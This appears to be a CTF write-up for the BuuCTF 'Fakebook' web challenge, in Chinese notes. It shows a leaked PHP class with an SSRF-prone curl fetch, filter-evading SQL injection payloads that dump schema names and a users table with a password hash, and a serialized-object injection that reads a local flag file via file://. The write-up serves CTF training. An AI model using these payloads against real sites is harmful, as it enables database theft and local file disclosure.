## [网鼎杯 2018]Fakebook

[[CTF/WEB/复现/BuuCTF/[网鼎杯 2020 朱雀组]phpweb|[网鼎杯 2020 朱雀组]phpweb]]
目录扫描出来了：/user.php.bak，读取文件

```php
<?php
class UserInfo
{
    public $name = "";
    public $age = 0;
    public $blog = "";

    public function __construct($name, $age, $blog)
    {
        $this->name = $name;
        $this->age = (int)$age;
        $this->blog = $blog;
    }

    function get($url)
    {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch);

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog);
    }

    public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
}
```







```python
?no=-1/**/union/**/select/**/1,group_concat(SCHEMA_NAME),3,4/**/from/**/information_schema.schemata

?no=-1/**/union/**/select/**/1,group_concat(table_name),3,4/**/from/**/information_schema.tables/**/where/**/table_schema='fakebook'
# users

?no=-1/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name='users'
#no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS	

?no=-1 union/**/select/**/1,group_concat(no,'~',username,'~',passwd,'~',data),3,4/**/from/**/fakebook.users
#1~bx33661~01d6a3a2b6cf409bea6e1d55daae1fc15ba01a02badc619f61ed206b45aed129e2d58ab8a2b93eb6a4a28bba49c9301db93853baab1bc228223777e010409593~O:8:"UserInfo":3:{s:4:"name";s:7:"bx33661";s:3:"age";i:18;s:4:"blog";s:15:"www.bx33661.com";}
```





```python
http://67e84776-cff2-4510-af21-d4b6793c8137.node5.buuoj.cn:81/view.php?no=-1 union/**/select/**/1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"mochu";s:3:"age";i:7;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
```

<img src="C:/Users/lenovo/AppData/Roaming/Typora/typora-user-images/image-20241018120738083.png" alt="image-20241018120738083" />

```
PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tiMTM5YTU2OS04NGUzLTQxZDktOTM5Yy1mNTg4MDhlYzA5NGR9IjsNCmV4aXQoMCk7DQo=
--->
<?php
$flag = "flag{b139a569-84e3-41d9-939c-f58808ec094d}";
exit(0);
```

